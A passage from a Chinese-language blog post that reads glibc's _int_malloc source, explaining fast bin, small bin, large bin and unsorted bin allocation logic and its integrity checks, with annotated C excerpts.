class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下<code>perturb_byte</code>为假，差不多意思就是如果你没有特殊设置，那么<code>data</code>段全为0字节，实际情况也确实是这样的。</p><h3 id="第二段：fast-bin的处理"><a href="#第二段：fast-bin的处理" class="headerlink" title="第二段：fast bin的处理"></a>第二段：fast bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//在malloc的时候检查了fastbin的size发现不对</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里嘛就会判断，你申请的这个<code>nb</code>是否<code>&lt;=global_max_fast</code>，如果成立那么就会先在<code>fast bin</code>中寻找能满足的<code>chunk</code>，并且一定是完全匹配。它先找到<code>av-&gt;fastbinY[idx]</code>观察是否为0，如果不为0则说明该<code>size</code>的<code>fast bin</code>有<code>chunk</code>，那么就做以下动作：</p><p>取出<code>av-&gt;fastbinY[idx]</code>给<code>victim</code></p><p>链表中删除这个<code>victim</code>，然后重新接回去。</p><p>中间有一个<code>check</code>，就是判断所给<code>chunk</code>的<code>fastbinY</code>链上的<code>size</code>是否＝我需要的<code>size</code>，如果不相等那么直接报错退出。</p><p>末尾也有一个<code>check</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Properties of chunks recycled from fastbins</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));</span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是<code>check</code>各个标志位，一般不会被触发，所以可以理解为<code>fast bin</code>在分配的时候只有这一个<code>check</code>，就是那个<code>chunk</code>的<code>size</code>一定是等于我申请的<code>size</code>的，过了就把这个<code>chunk</code>的指针返回，<code>check</code>没过报错，如果根本都没取到<code>fast bin</code>，那么就进行下面的逻辑了。</p><h3 id="第三段：small-bin的处理"><a href="#第三段：small-bin的处理" class="headerlink" title="第三段：small bin的处理"></a>第三段：small bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先判断它在不在<code>small bin</code>的范围内，然后取出这个<code>size</code>的<code>small bin</code>的最后一个<code>chunk</code>。它添加是在头部添加的，因此是符合先进先出的，嗯。然后需要判断，如果最后一个chunk!=自身的话，两个情况：要么没初始化<code>arena</code>，那就初始化，要么它有一个合法的块。如果它指向自身那就没必要做过多的判断了，没有这个大小的<code>small bin</code>。</p><p>这里是调用了<code>malloc_consolidate</code>函数去初始话这个<code>arena</code>分配器，该函数逻辑如下，不重点解读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span><span class="function">mlined version of consolidation code in <span class="title">free</span><span class="params">()</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    maxfb </span>= &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, size);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">          size += nextsize;</span><br><span class="line">          unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">        unsorted_bin-&gt;fd = p;</span><br><span class="line">        first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">          p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        p-&gt;bk = unsorted_bin;</span><br><span class="line">        p-&gt;fd = first_unsorted;</span><br><span class="line">        set_foot(p, size);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是清空所有<code>arena</code>的<code>chunk</code>，可以看到大的<code>if</code>是判断<code>global_max_fast</code>是否为0，为0则初始化，调用<code>malloc_init_state</code>和<code>check_malloc_state</code>函数初始化堆。否则把所有的<code>fast bin</code> 取出来，先清除它们的标志位，然后扔到<code>unsorted bin</code>中尝试向前合并或者向后合并。</p><p>这个呢，不太能运行到，因为<code>victim==0</code>的时候，必还没初始化，没初始化到这里就要初始化，初始化了之后<code>victim</code>又不可能<code>=0</code>了，所以这里可以理解为就是初始化<code>arena</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s)                          \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><p>这里判断了一下<code>victim-&gt;bk-&gt;fd==victim</code>。也就是当前这个堆块后一个堆块的<code>fd</code>指针是否指向<code>victim</code>，如果不等说明链表被破坏了，那么就报错退出。</p><p>然后<code>set_inuse_bit_at_offset</code>，这个也不难理解，因为现在这个<code>small bin</code>被取出来了要使用了，所以我得设置后一个块的<code>prev_inuse</code>为1证明它不是空闲堆块了。然后就是进行<code>unlink</code>操作，对链表熟悉的同学应该看得懂。如果我要删除<code>victim</code>元素那应该怎么写逻辑？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd-&gt;bk=victim-&gt;bk;</span><br><span class="line">victime-&gt;bk-&gt;fd=victim-&gt;fd;</span><br></pre></td></tr></table></figure><p>在这里呢，我们取链的最后一个<code>chunk</code>，也就是<code>bin-&gt;bk=victim</code>所以<code>victim-&gt;fd=bin</code></p><p>然后前面有一个赋值就是<code>bck=victim-&gt;bk</code>。带进上面的式子就得到了源码里面这样的写法。</p><p>然后下面设置<code>main_arena</code>标志位，一波同样的<code>check</code>，然后返回内存指针。也就是这里的<code>chunk2mem</code>，我们这里用的<code>chunk</code>指针，但是其实我们要返回的应该是<code>chunk</code>中数据域的指针，所以这里用了这样的宏定义做替换。</p><p>然后就是清除<code>data</code>数据，但是这个一般不会被执行，前面也分析过了，然后返回。这是<code>small bin</code>找到对应的<code>chunk</code>的逻辑，如果<code>small bin</code>还没找到那么接下来应该要去找<code>large bin</code>了，那么我们接着往下读。</p><h3 id="第四段：分配largebin时的操作"><a href="#第四段：分配largebin时的操作" class="headerlink" title="第四段：分配largebin时的操作"></a>第四段：分配largebin时的操作</h3><p>那么如果没有在small bin的范围内呢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较耐人寻味。</p><p>先获取<code>large bin</code>的<code>index</code>，然后如果<code>fast bin</code>不为空，调用<code>malloc_consolidate</code>。这一步是什么意思呢？我们前面分析过<code>malloc_consolidate</code>，如果没有初始化，那么初始化，如果初始化了，那么合并所有的<code>fast bin</code>。但是这里，都已经有<code>fast bin</code>存在了，那么堆指定已经初始化了，所以这里执行的逻辑基本只能是合并所有<code>fast chunk</code>。为什么要在搜索<code>large bin</code>的时候合并所有<code>fast bin</code>呢？因为<code>large bin</code>的匹配方式是最小能满足，然后切割。</p><p>考虑这样一种情况：</p><p>如果一个<code>0x20</code>的<code>fast bin</code>和0x500的<code>large bin</code>物理相邻。此时我要申请一个<code>0x510</code>的<code>large bin</code>，如果此时<code>fast bin</code>被合并了，那么我就能找到一个<code>0x520</code>的<code>large bin</code>并把它返回给用户。如果我不做这一步，那么我找不到<code>0x510</code>大小的<code>large bin</code>，我就被迫只能切割<code>top_chunk</code>了，这样子就浪费了很大的一块内存。</p><p>那么这个会不会有多此一举的时候呢，也是会的，还是刚刚那种情况，假如我申请<code>0x500</code>的<code>chunk</code>。这样子合并之后又会被切割，那么这样子，之前的合并就显得多次一举了，但是它只是浪费了一部分时间开销，内存分配上还是执行上面的逻辑比较占优势。所以这一步可以理解为空间上的优化，但是牺牲了小部分时间。看不来的话可以多看看上面举得例子。</p><h3 id="第五段：large-bin和unsorted-bin的相爱相杀"><a href="#第五段：large-bin和unsorted-bin的相爱相杀" class="headerlink" title="第五段：large bin和unsorted bin的相爱相杀"></a>第五段：large bin和unsorted bin的相爱相杀</h3><p>这里开始逻辑都混合起来了，不仅有<code>large bin</code>，unsorted bin，切割<code>top_chunk</code>，还有系统调用重新分配<code>top_chunk</code>。</p><h4 id="第1小块"><a href="#第1小块" class="headerlink" title="第1小块"></a>第1小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">           ......</span><br><span class="line">         &#125;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先外面套了一个<code>while(1)</code>，然后里面有一个<code>while</code>循环，判断内容就是取得最后一个<code>unsorted chunk</code>是否与这个<code>bin</code>相等，这里大概就是开始遍历<code>unsorted chunk</code>了。</p><p>然后这里又有一个<code>check</code>。<code>victim-&gt;size &lt;= 2 * SIZE_SZ</code>就是说<code>chunk</code>的<code>size</code>小于等于<code>0x10</code>，<code>victim-&gt;size &gt; av-&gt;system_mem</code>就是说我一个块的<code>size</code>居然比我系统调用申请来的内存都多，那这肯定不合理啊，所以任意满足一个就会报错了。</p><h4 id="第二小块"><a href="#第二小块" class="headerlink" title="第二小块"></a>第二小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 